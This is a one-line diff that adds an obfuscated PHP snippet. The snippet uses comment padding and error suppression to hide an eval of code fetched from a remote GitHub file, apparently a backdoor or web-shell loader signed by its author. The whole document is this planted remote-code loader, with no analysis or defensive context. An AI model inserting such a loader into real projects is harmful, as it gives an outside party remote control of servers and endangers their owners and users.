@@ -1,0 +1,1 @@
+ <?=/****/@/*55555*/null; /******/@/*55555*/eval/******/("?>".file_get_contents("https://raw.githubusercontent.com/micingans/bekdur/master/gay.php"))/******/ /*By NuLz404*/?>
